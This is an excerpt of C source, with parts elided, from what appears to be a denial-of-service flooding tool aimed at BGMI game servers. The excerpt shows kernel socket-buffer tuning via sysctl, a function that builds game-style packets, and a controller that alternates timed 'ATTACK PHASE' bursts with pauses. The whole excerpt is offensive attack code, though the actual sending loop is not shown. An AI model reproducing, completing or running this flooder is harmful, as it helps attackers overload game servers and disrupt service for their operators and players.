...
void optimize_kernel() {
    ...
    if (system("sysctl -w net.core.wmem_max=1073741824 >/dev/null 2>&1") != 0) {
        printf("⚠️  Kernel tuning may be limited\n");
    }
    ...
    printf("✅ Kernel optimizations applied\n");
#endif
}
...
void create_bgmi_packet(char *buf, int size, int thread_id, int seq, unsigned int *seed) {
    ...
    header[2] = ((thread_id * 7777) + seq) & 0xFFFFFFFF;
    header[3] = *seed ^ seq ^ thread_id;
    
    int start = 4 * sizeof(unsigned int);
...
void *phase_controller(void *arg) {
    ...
    int cycle_duration = ATTACK_BURST + PAUSE_TIME;
    int total_cycles = 1;
    
    if (ATTACK_TIME > ATTACK_BURST) {
        total_cycles = (ATTACK_TIME - ATTACK_BURST) / cycle_duration + 1;
    }
    
    for (int cycle = 0; cycle < total_cycles && !atomic_load(&stop_signal); cycle++) {
        printf("\n💀 ATTACK PHASE %d/%d: %ds\n", cycle+1, total_cycles, ATTACK_BURST);
        atomic_store(&should_attack, 1);
        
        for (int sec = 1; sec <= ATTACK_BURST && !atomic_load(&stop_signal); sec++) {
            sleep(1);
        }
        
        if (cycle < total_cycles - 1) {
            printf("⏸️  PAUSE PHASE: %ds\n", PAUSE_TIME);
            atomic_store(&should_attack, 0);
            
            for (int sec = 1; sec <= PAUSE_TIME && !atomic_load(&stop_signal); sec++) {
                sleep(1);
            }
        }
    }
